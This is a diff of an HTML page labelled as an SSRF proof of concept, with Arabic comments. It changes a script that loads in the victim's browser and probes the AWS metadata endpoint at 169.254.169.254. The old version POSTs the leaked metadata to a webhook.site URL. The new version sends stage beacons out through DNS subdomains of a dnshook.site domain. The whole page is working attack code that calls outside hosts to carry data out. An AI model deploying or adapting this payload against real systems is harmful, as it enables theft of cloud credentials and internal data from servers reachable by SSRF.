@@ -1,44 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF PoC</title>
+    <title>SSRF PoC - DNS Exfil v3</title>
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
-        // الرابط الخاص بك من webhook.site
-        const EXFIL_URL = "https://webhook.site/a5852858-9701-4e74-896b-ba98539cebed";
+        // نطاق DNSHook الجديد الخاص بك
+        const DNS_HOOK_DOMAIN = "a5852858-9701-4e74-896b-ba98539cebed.dnshook.site";
 
-        // دالة لإرسال البيانات المسروقة
+        // دالة بسيطة لتسريب البيانات عبر DNS
         function exfiltrate(data) {
-            fetch(EXFIL_URL, {
-                method: 'POST',
-                mode: 'no-cors', // مهم لتجنب مشاكل CORS
-                headers: {
-                    'Content-Type': 'text/plain'
-                },
-                body: data
-            });
+            // استبدال الأحرف غير الصالحة بنقاط
+            let subdomain = data.replace(/[^a-zA-Z0-9-]/g, '.').substring(0, 60);
+            // استخدام fetch لتجنب مشاكل حظر الصور
+            fetch("http://" + subdomain + "." + DNS_HOOK_DOMAIN, { mode: 'no-cors' });
         }
 
-        // إبلاغ عن بدء الهجوم
-        exfiltrate("PoC Script Loaded. Waiting for DNS Rebind...");
+        exfiltrate("Stage1-PoC-Loaded-in-Browser");
 
-        // محاولة الوصول إلى بيانات AWS Metadata بعد 7 ثوانٍ
-        // هذا التأخير يعطي فرصة لحدوث إعادة ربط DNS
         setTimeout(() => {
-            exfiltrate("Attempting to fetch AWS metadata...");
-            fetch('http://169.254.169.254/latest/meta-data/')
-                .then(response => response.text())
-                .then(data => {
-                    // إذا نجح، أرسل البيانات المسروقة
-                    exfiltrate("SUCCESS! Leaked Data:\n\n" + data);
+            exfiltrate("Stage2-Attempting-Internal-Fetch");
+            fetch('http://169.254.169.254/')
+                .then(response => {
+                    exfiltrate("Stage3-SUCCESS-Internal-Connection-OK");
                 })
                 .catch(error => {
-                    // إذا فشل، أبلغ عن الخطأ
-                    exfiltrate("FAILED to fetch metadata. Error: " + error.toString());
+                    exfiltrate("Stage4-FAILED-Internal-Connection-Blocked");
                 });
-        }, 7000); // 7 ثوانٍ
+        }, 7000);
     </script>
 </body>
 </html>
